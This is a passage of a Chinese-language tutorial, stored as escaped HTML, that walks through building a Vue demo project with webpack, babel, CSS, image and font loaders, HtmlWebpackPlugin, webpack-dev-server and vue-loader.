lang=\"bash\"\u003e{\n  \u003cspan class=\"hljs-string\"\u003e\"name\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"vue-demo\"\u003c/span\u003e,\n  \u003cspan class=\"hljs-string\"\u003e\"version\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"1.0.0\"\u003c/span\u003e,\n  \u003cspan class=\"hljs-string\"\u003e\"description\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"this is a vue demo\"\u003c/span\u003e,\n  \u003cspan class=\"hljs-string\"\u003e\"main\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"index.js\"\u003c/span\u003e,\n  \u003cspan class=\"hljs-string\"\u003e\"scripts\"\u003c/span\u003e: {\n    \u003cspan class=\"hljs-string\"\u003e\"test\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"echo \\\"Error: no test specified\\\" \u0026amp;\u0026amp; exit 1\"\u003c/span\u003e\n  },\n  \u003cspan class=\"hljs-string\"\u003e\"license\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"ISC\"\u003c/span\u003e,\n  \u003cspan class=\"hljs-string\"\u003e\"dependencies\"\u003c/span\u003e: {\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e引入webpack  ，关于如何使用webpack 请参考\u003ca target=\"_blank\" href=\"https://doc.webpack-china.org/concepts/\"\u003e官网\u003c/a\u003e\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e    npm install webpack --save-dev\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e如果使用npm下载的速度过慢，可以使用淘宝的cnpm 镜像\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e    npm install -g cnpm –registry=https://registry.npm.taobao.org\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e输入以上命令即可将npm指向国内镜像，使用时需将npm 替换成cnpm即可， 其他不变\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e在项目中创建webpack.config.js 文件\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003econst path = require(\u003cspan class=\"hljs-string\"\u003e'path'\u003c/span\u003e)\nmodule.exports ={\n    entry:\u003cspan class=\"hljs-string\"\u003e'./src/main.js'\u003c/span\u003e,\n    output:{\n        path:path.resolve(__dirname,\u003cspan class=\"hljs-string\"\u003e'dist'\u003c/span\u003e),\n        filename:\u003cspan class=\"hljs-string\"\u003e\"demo.js\"\u003c/span\u003e\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e使用webpack 命令编译\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003ewebpack\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e编译之后的项目目录大概如下:\n\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/26/160934997ed72579?w=292\u0026amp;h=191\u0026amp;f=png\u0026amp;s=5249\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e注意：在使用webpack命令之前 需先创建 index.html 和  main.js 文件 其中 main.js文件位于src 目录下\u003c/p\u003e\n\u003cp\u003eindex.html 的内容如下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;!DOCTYPE html\u0026gt;\n\u0026lt;html lang=\u003cspan class=\"hljs-string\"\u003e\"en\"\u003c/span\u003e\u0026gt;\n\u0026lt;head\u0026gt;\n    \u0026lt;meta charset=\u003cspan class=\"hljs-string\"\u003e\"UTF-8\"\u003c/span\u003e\u0026gt;\n    \u0026lt;title\u0026gt;vue demo\u0026lt;/title\u0026gt;\n\u0026lt;/head\u0026gt;\n\u0026lt;body\u0026gt;\n    \u0026lt;script src=\u003cspan class=\"hljs-string\"\u003e\"./dist/demo.js\"\u003c/span\u003e\u0026gt;\u0026lt;/script\u0026gt;\n\u0026lt;/body\u0026gt;\n\u0026lt;/html\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003emain.js 的内容如下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003ealert(\u003cspan class=\"hljs-string\"\u003e'hello world'\u003c/span\u003e);\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e引入vue\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e    npm install vue --save\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e执行命令后会在package.json中新增如下代码\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\"dependencies\": {\n\"vue\": \"^2.4.2\"\n}\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e将main.js中的内容修改为如下代码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eimport Vue from \u003cspan class=\"hljs-string\"\u003e'vue'\u003c/span\u003e\nvar vm = new Vue({\n    el:\u003cspan class=\"hljs-string\"\u003e'#app'\u003c/span\u003e,\n    data:{\n        msg:\u003cspan class=\"hljs-string\"\u003e'hello vue'\u003c/span\u003e\n    }\n})\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e引入babel\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003enpm install --save-dev babel-core babel-loader\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e由于在使用vue时会用到很多es6的语法，但是现在很多浏览器对es6的支持不是很好，所以在编译时需要将这些语法转换es5的语法，此时我们使用babel来进行编译。\u003c/p\u003e\n\u003cp\u003ebabel的使用请阅读官网文档http://babeljs.cn/。\u003c/p\u003e\n\u003cp\u003e将babel加入到webpack.config.js 配置文件中：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003econst path = require(\u003cspan class=\"hljs-string\"\u003e'path'\u003c/span\u003e)\n\nmodule.exports ={\n    entry:\u003cspan class=\"hljs-string\"\u003e'./src/main.js'\u003c/span\u003e,\n    output:{\n        path:path.resolve(__dirname,\u003cspan class=\"hljs-string\"\u003e'dist'\u003c/span\u003e),\n        filename:\u003cspan class=\"hljs-string\"\u003e\"demo.js\"\u003c/span\u003e\n    },\n    module:{\n        rules:[\n            {\n                \u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e: /\\.js$/,\n                loader:\u003cspan class=\"hljs-string\"\u003e\"babel-loader\"\u003c/span\u003e,\n                exclude: /node_modules/\n            }\n        ]\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e然后命令行输入 webpack 命令即可进行编译，再编译完成后用浏览器打开index.html 文件，此时会发现浏览器控制台出现以下错误：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e[Vue warn]: You are using the runtime-only build of Vue \u003cspan class=\"hljs-built_in\"\u003ewhere\u003c/span\u003e the template compiler is not available. Either pre-compile the templates into render \u003cspan class=\"hljs-built_in\"\u003efunctions\u003c/span\u003e, or use the compiler-included build.\n\n(found \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u0026lt;Root\u0026gt;)\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这是因为正在使用的是vue的运行时版本，而此版本中的编译器时不可用的，我们需要把它切换成运行时 + 编译的版本，需要在配置文件中添加如下代码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e resolve: {\n    \u003cspan class=\"hljs-built_in\"\u003ealias\u003c/span\u003e: {\n       \u003cspan class=\"hljs-string\"\u003e'vue$'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'vue/dist/vue.esm.js'\u003c/span\u003e // \u003cspan class=\"hljs-string\"\u003e'vue/dist/vue.common.js'\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e webpack 1\n    }\n }\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e此时在运行webpack 命令重新编译，编译后在访问index.html页面，页面内容如下图\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/26/1609353959e1e592?w=600\u0026amp;h=171\u0026amp;f=png\u0026amp;s=4239\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\n此时一个基于webpack的vue 项目就搭建好。\u003cp\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003ewebpack的一些常用配置\u003c/h3\u003e\n\u003cp\u003e在项目的实际开发中我们还会引入css、图片以及字体等资源文件。这些文件的引入都需要相应的加载器才能将其加载到项目中并正常使用。\u003c/p\u003e\n\u003cp\u003e下面只介绍部分我们需要的加载器的使用方法,\n更多信息请查阅\u003ca target=\"_blank\" href=\"https://doc.webpack-china.org/loaders\"\u003ewebpack加载器文档\u003c/a\u003e。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003ecss加载器\u003c/h3\u003e\n\u003cp\u003e我们需要引入css-loader、和style-loader  (安装style-loader的目的是为了在html中以style的方式嵌入css )。\u003c/p\u003e\n\u003cp\u003e执行命令\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e    npm install --save-dev css-loader style-loader\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e在 webpack.config.js  中进行如下配置\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e    module: {\n        rules: [{\n            \u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e: /\\.js$/,\n            loader: \u003cspan class=\"hljs-string\"\u003e\"babel-loader\"\u003c/span\u003e,\n            exclude: /node_modules/\n        }, {\n            \u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e: /\\.css$/,\n            loader: \u003cspan class=\"hljs-string\"\u003e'style-loader!css-loader'\u003c/span\u003e\n        }]\n    },\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e然后再src 目录下 新建一个styles的文件夹并在里面添加一个main.css的文件,写上以下内容\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-comment\"\u003e#app{\u003c/span\u003e\n    color:red;\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e然后再运行 webpack 命令, 并重新加载index.html 文件 ,可见css已经生效,效果如下图\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/26/160935cfa424a6e3?w=517\u0026amp;h=79\u0026amp;f=png\u0026amp;s=3628\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e图片资源的加载\u003c/h3\u003e\n\u003cp\u003e使用file-loader或者url-loader加载器进行加载，他们都是用于打包文件和图片资源的，两者的区别是url-loader在file-loader的基础上进行了一次封装。\u003c/p\u003e\n\u003cp\u003e在访问网站时如果图片较多，会发很多http请求，会降低页面性能。这个问题可以通过url-loader解决。url-loader会将引入的图片编码，生成dataURl。相当于把图片数据翻译成一串字符,再把这串字符打包到文件中，最终只需要引入这个文件就能访问图片了。\u003c/p\u003e\n\u003cp\u003e当然，如果图片较大，编码会消耗性能。因此url-loader提供了一个limit参数，小于limit字节的文件会被转为DataURl，大于limit的还会使用file-loader进行copy。\u003c/p\u003e\n\u003cp\u003e此处我们使用url-loader,由于它是基于file-loader的封装，所以也需要引入file-loader。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003enpm install --save-dev file-loader url-loader\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003ewebpack.config.js 的rules 中增加如下配置\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e{\n    \u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e: /\\.(png|jpe?g|gif|svg)(\\?.*)?$/,\n    loader: \u003cspan class=\"hljs-string\"\u003e'url-loader'\u003c/span\u003e,\n    options: {\n      \u003cspan class=\"hljs-built_in\"\u003elimit\u003c/span\u003e: 10000\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e接下来就是将图片引入到代码中，需要在main.js和index.html 分别作如下修改:\u003c/p\u003e\n\u003cp\u003emain.js\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eimport Vue from \u003cspan class=\"hljs-string\"\u003e'vue'\u003c/span\u003e\nimport \u003cspan class=\"hljs-string\"\u003e'./styles/main.css'\u003c/span\u003e\nimport logo from\u003cspan class=\"hljs-string\"\u003e'./images/logo.png'\u003c/span\u003e\n\nvar vm = new Vue({\n    el:\u003cspan class=\"hljs-string\"\u003e'#app'\u003c/span\u003e,\n    data:{\n        logo:logo,\n        msg:\u003cspan class=\"hljs-string\"\u003e'hello vue'\u003c/span\u003e\n    }\n})\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eindex.html\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;!DOCTYPE html\u0026gt;\n\u0026lt;html lang=\u003cspan class=\"hljs-string\"\u003e\"en\"\u003c/span\u003e\u0026gt;\n\u0026lt;head\u0026gt;\n    \u0026lt;meta charset=\u003cspan class=\"hljs-string\"\u003e\"UTF-8\"\u003c/span\u003e\u0026gt;\n    \u0026lt;title\u0026gt;vue demo\u0026lt;/title\u0026gt;\n\u0026lt;/head\u0026gt;\n\u0026lt;body\u0026gt;\n    \u0026lt;div id=\u003cspan class=\"hljs-string\"\u003e\"app\"\u003c/span\u003e\u0026gt;\n        \u0026lt;img :src=\u003cspan class=\"hljs-string\"\u003e\"logo\"\u003c/span\u003e alt=\u003cspan class=\"hljs-string\"\u003e\"logo\"\u003c/span\u003e class=\u003cspan class=\"hljs-string\"\u003e\"logo\"\u003c/span\u003e\u0026gt;\n        {{msg}}\n    \u0026lt;/div\u0026gt;\n    \u0026lt;script src=\u003cspan class=\"hljs-string\"\u003e\"./dist/demo.js\"\u003c/span\u003e\u0026gt;\u0026lt;/script\u0026gt;\n\u0026lt;/body\u0026gt;\n\u0026lt;/html\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e最后运行webpack 命令并访问 index.html ，结果如下\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/26/1609361c9c1278c2?w=529\u0026amp;h=278\u0026amp;f=png\u0026amp;s=11203\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e在测试中发现当图片大于10KB的时候发现加载图片失败，找不到图片，但此时在dist目录下面是能看到已经通过加载器加载成功了的图片，再通过浏览器的开发者工具对图片的引用路径进行检查时，可以发现页面中img的路径不对，路径中只有文件名缺失了前面的dist目录,所以此时我们需要将main.js中的代码进行如下修改\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003elogo:\u003cspan class=\"hljs-string\"\u003e\"./dist/\"\u003c/span\u003e+logo,\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e重新编译后图片就显示出来了。但是现在新的问题又出来了，由于我们在配置文件中配置了小于10kb的代码将以 base64的形式内联在代码中。所以此时是不需要 \"./dist\" 这个前缀的。\n解决此问题有两种办法：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e不使用base64的形式将图片内嵌到代码中\u003c/li\u003e\n\u003cli\u003e将html文件放到dist目录中\n既然用了url-loader加载器则不推荐使用第一种。所以我们使用第二种方式。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e将html文件放到dist目录中最简单的办法就是把index.html文件复制到dist目录中，然后将引入就是的代码改为：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e    \u0026lt;script src=\u003cspan class=\"hljs-string\"\u003e\"./demo.js\"\u003c/span\u003e \u0026gt; \u0026lt;/script\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003emain.js中改回原来的设置\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003elogo:logo,\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e重新编译后图片在两种情况下都可以加载出来了。\u003c/p\u003e\n\u003cp\u003e还有一中比较常用的方式是在编译时自动在dist的目录中创建一个html文件并将index.html中的内容复制过去。此时我们需要时webpack的 HtmlWebpackPlugin 插件。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003eHtmlWebpackPlugin 插件\u003c/h3\u003e\n\u003cp\u003e引入插件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e    npm install --save-dev html-webpack-plugin\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003ewebpack.config.js 中增加如下配置\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003econst HtmlWebpackPlugin = require(\u003cspan class=\"hljs-string\"\u003e'html-webpack-plugin'\u003c/span\u003e)\n...\n\nplugins:[\n     new HtmlWebpackPlugin()\n]\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e重新编译后发现在dist目录下生成了如下内容的html的文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;!DOCTYPE html\u0026gt;\n\u0026lt;html\u0026gt;\n  \u0026lt;head\u0026gt;\n    \u0026lt;meta charset=\u003cspan class=\"hljs-string\"\u003e\"UTF-8\"\u003c/span\u003e\u0026gt;\n    \u0026lt;title\u0026gt;Webpack App\u0026lt;/title\u0026gt;\n  \u0026lt;/head\u0026gt;\n  \u0026lt;body\u0026gt;\n  \u0026lt;script \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"text/javascript\"\u003c/span\u003e src=\u003cspan class=\"hljs-string\"\u003e\"demo.js\"\u003c/span\u003e\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;/body\u0026gt;\n\u0026lt;/html\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e与我们原来自己的写index.html相比，该文件缺少了下面这些这些内容\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e    \u0026lt;div id=\u003cspan class=\"hljs-string\"\u003e\"app\"\u003c/span\u003e\u0026gt;\n        \u0026lt;img :src=\u003cspan class=\"hljs-string\"\u003e\"logo\"\u003c/span\u003e alt=\u003cspan class=\"hljs-string\"\u003e\"logo\"\u003c/span\u003e class=\u003cspan class=\"hljs-string\"\u003e\"logo\"\u003c/span\u003e\u0026gt;\n        {{msg}}\n    \u0026lt;/div\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e现在需要对配置文件做稍微的修改，让html文件在创建的时候自动将index.html的中内容复制过去。通过查阅该插件的文档，可知需做如下修改：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eplugins:[\n     new HtmlWebpackPlugin({\n          title: \u003cspan class=\"hljs-string\"\u003e'vue demo'\u003c/span\u003e,\n          template: \u003cspan class=\"hljs-string\"\u003e'index.html'\u003c/span\u003e         \n     })\n]\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eindex.html 文件中 去除 script代码，在重新编译后，即可获取我们需要的html文件\u003c/p\u003e\n\u003cp\u003e详细参数配置请参考\u003ca target=\"_blank\" href=\"https://github.com/jantimon/html-webpack-plugin#configuration\"\u003e官方文档\u003c/a\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003ewebpack-dev-server\u003c/h3\u003e\n\u003cp\u003e在我们实际开发中需要将代码部署在server中，而不是在浏览器中直接打开文件。此时我们需要使用webpack的 webpack-dev-server 。\u003c/p\u003e\n\u003cp\u003ewebpack-dev-server 为我们提供了一个简单的web服务器，并且能够实时重新加载（live reloading）。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e    npm install --save-dev webpack-dev-server\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e在webpack.config.js 文件中需要指定一个文件夹,告诉开发服务器需要从哪儿加载文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003econst path = require(\u003cspan class=\"hljs-string\"\u003e'path'\u003c/span\u003e)\nconst HtmlWebpackPlugin = require(\u003cspan class=\"hljs-string\"\u003e'html-webpack-plugin'\u003c/span\u003e)\n\nmodule.exports = {\n    entry: \u003cspan class=\"hljs-string\"\u003e'./src/main.js'\u003c/span\u003e,\n    output: {\n        path: path.resolve(__dirname, \u003cspan class=\"hljs-string\"\u003e'dist'\u003c/span\u003e),\n        filename: \u003cspan class=\"hljs-string\"\u003e\"demo.js\"\u003c/span\u003e\n    },\n    plugins: [\n        new HtmlWebpackPlugin({\n            title: \u003cspan class=\"hljs-string\"\u003e'vue demo'\u003c/span\u003e,\n            template: \u003cspan class=\"hljs-string\"\u003e'index.html'\u003c/span\u003e\n        })\n    ],\n    devServer:{\n        contentBase:\u003cspan class=\"hljs-string\"\u003e\"./dist\"\u003c/span\u003e\n    },\n    module: {\n        rules: [{\n                \u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e: /\\.js$/,\n                loader: \u003cspan class=\"hljs-string\"\u003e\"babel-loader\"\u003c/span\u003e,\n                exclude: /node_modules/\n            }, {\n                \u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e: /\\.css$/,\n                loader: \u003cspan class=\"hljs-string\"\u003e'style-loader!css-loader'\u003c/span\u003e\n            }, {\n                \u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e: /\\.(png|jpe?g|gif|svg)(\\?.*)?$/,\n                loader: \u003cspan class=\"hljs-string\"\u003e'url-loader'\u003c/span\u003e,\n                options: {\n                    \u003cspan class=\"hljs-built_in\"\u003elimit\u003c/span\u003e: 10000\n                }\n            },\n            {\n                \u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e: /\\.(woff2?|eot|ttf|otf)(\\?.*)?$/,\n                loader: \u003cspan class=\"hljs-string\"\u003e'url-loader'\u003c/span\u003e,\n                options: {\n                    \u003cspan class=\"hljs-built_in\"\u003elimit\u003c/span\u003e: 10000\n                }\n            }\n        ]\n    },\n    resolve: {\n        \u003cspan class=\"hljs-built_in\"\u003ealias\u003c/span\u003e: {\n            \u003cspan class=\"hljs-string\"\u003e'vue$'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'vue/dist/vue.esm.js'\u003c/span\u003e // \u003cspan class=\"hljs-string\"\u003e'vue/dist/vue.common.js'\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e webpack 1\n        }\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e上面红色字体的配置信息是告知webpack-dev-server， 在localhost:8080 下建立服务，将 dist 目录下的文件，作为可访问文件。\u003c/p\u003e\n\u003cp\u003e让我们在package.json中添加一个script脚本,可以直接运行开发服务器(dev server)：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e \u003cspan class=\"hljs-string\"\u003e\"scripts\"\u003c/span\u003e: {\n    \u003cspan class=\"hljs-string\"\u003e\"test\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"echo \\\"Error: no test specified\\\" \u0026amp;\u0026amp; exit 1\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"dev\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"webpack-dev-server --open\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"build\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"webpack\"\u003c/span\u003e\n  },\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e然后输入如下命令\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e    npm run dev\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e启动完成后，浏览器会自动打开一个访问 http://localhost:8080/ 的页面\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/26/160938614cf6772e?w=323\u0026amp;h=294\u0026amp;f=png\u0026amp;s=9101\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e此时服务已启动成功。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e字体的加载\u003c/h3\u003e\n\u003cp\u003e字体的加载方式与图片的一样也是用url-loader，配置如下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e{\n    \u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e: /\\.(woff2?|eot|ttf|otf)(\\?.*)?$/,\n    loader: \u003cspan class=\"hljs-string\"\u003e'url-loader'\u003c/span\u003e,\n    options: {\n        \u003cspan class=\"hljs-built_in\"\u003elimit\u003c/span\u003e: 10000\n    }\n }\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003evue-loader\u003c/h3\u003e\n\u003cp\u003e在vue的开发过程中，通常我们需要写.vue结尾的文件即组件，如app.vue\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;template\u0026gt;\n    \u0026lt;div id=\u003cspan class=\"hljs-string\"\u003e\"app\"\u003c/span\u003e\u0026gt;\n        \u0026lt;img src=\u003cspan class=\"hljs-string\"\u003e\"./images/logo2.jpg\"\u003c/span\u003e alt=\u003cspan class=\"hljs-string\"\u003e\"logo\"\u003c/span\u003e \u0026gt;\n        {{msg}}\n    \u0026lt;/div\u0026gt;\n\u0026lt;/template\u0026gt;\n\u0026lt;script\u0026gt;\n    \u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e default {\n        name:\u003cspan class=\"hljs-string\"\u003e'app'\u003c/span\u003e,\n        \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003edata\u003c/span\u003e\u003c/span\u003e(){\n            \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e {\n                msg:\u003cspan class=\"hljs-string\"\u003e\"hello vue !!\"\u003c/span\u003e\n            }\n        }\n    }\n\u0026lt;/script\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e该文件需要通过vue-loader来进行加载，现在我们需要做如下配置。通过 vue-loader 和vue-template-compiler来加载并编译.vue文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003enpm install --save-dev vue-loader vue-template-compiler\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003ewebpack.config.js 中\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e{\n    \u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e: /\\.vue$/,\n    loader: \u003cspan class=\"hljs-string\"\u003e'vue-loader'\u003c/span\u003e\n }\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e为了在vue中引入对.vue的使用，我们需进行如下修改\u003c/p\u003e\n\u003cp\u003eindex.html\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;!DOCTYPE html\u0026gt;\n\u0026lt;html lang=\u003cspan class=\"hljs-string\"\u003e\"en\"\u003c/span\u003e\u0026gt;\n\u0026lt;head\u0026gt;\n    \u0026lt;meta charset=\u003cspan class=\"hljs-string\"\u003e\"UTF-8\"\u003c/span\u003e\u0026gt;\n    \u0026lt;title\u0026gt;vue demo\u0026lt;/title\u0026gt;\n\u0026lt;/head\u0026gt;\n\u0026lt;body\u0026gt;\n    \u0026lt;div id=\u003cspan class=\"hljs-string\"\u003e\"app\"\u003c/span\u003e\u0026gt;\n    \u0026lt;/div\u0026gt;\n\u0026lt;/body\u0026gt;\n\u0026lt;/html\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003emain.js\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eimport Vue from \u003cspan class=\"hljs-string\"\u003e'vue'\u003c/span\u003e\nimport \u003cspan class=\"hljs-string\"\u003e'./styles/main.css'\u003c/span\u003e\nimport App from \u003cspan class=\"hljs-string\"\u003e'./app.vue'\u003c/span\u003e\n\nnew Vue({\n    el: \u003cspan class=\"hljs-string\"\u003e'#app'\u003c/span\u003e,\n    template: \u003cspan class=\"hljs-string\"\u003e'\u0026lt;App/\u0026gt;'\u003c/span\u003e,\n    components: { App }\n})\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eapp.vue\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;template\u0026gt;\n    \u0026lt;div id=\u003cspan class=\"hljs-string\"\u003e\"app\"\u003c/span\u003e\u0026gt;\n        \u0026lt;img src=\u003cspan 